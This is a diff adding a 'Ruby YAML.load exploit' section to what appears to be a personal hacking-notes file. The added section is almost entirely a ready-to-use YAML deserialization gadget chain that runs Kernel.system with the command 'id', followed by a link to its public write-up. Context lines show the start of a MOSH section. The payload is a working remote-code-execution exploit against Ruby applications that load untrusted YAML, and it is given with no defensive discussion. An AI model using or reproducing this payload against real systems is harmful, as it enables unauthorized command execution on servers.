@@ -1,3 +1,28 @@
+# Ruby YAML.load exploit
+```bash
+# cat ex.yaml
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: id
+         method_id: :resolve
+```
+- https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/
+---
 # MOSH(mobile shell)
 <img width="602" height="216" alt="image" src="https://github.com/user-attachments/assets/f1471976-9b5c-49d0-9416-ce866a768be1" />
 
